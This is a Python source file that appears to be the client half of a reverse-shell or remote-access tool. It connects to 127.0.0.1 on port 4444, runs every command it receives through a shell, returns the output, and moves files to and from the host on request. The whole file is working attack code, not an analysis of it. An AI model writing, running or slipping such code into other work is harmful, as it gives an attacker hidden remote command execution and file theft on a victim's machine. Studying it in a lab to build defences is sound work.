import socket
import subprocess
import json
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(("127.0.0.1",4444))


def reliable_send(s,data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv(s):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name,target):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name,target):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def start_comm():
    while True:
        try:
            cmd  = server.recv(1024).decode()
            print("cmd = ",cmd)
            args = cmd.split(" ")
            if args[0] == 'upload':  #server side upload => client side download
                print(f'downloading {args[1]}')
                download_file(args[1], server)
            elif args[0] == 'download':   #server side download => client side upload
                print(f'uploading {args[1]}')
                upload_file(args[1], server)
            else:
                execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(server, result)
        except KeyboardInterrupt:
            print("done")
            break

start_comm()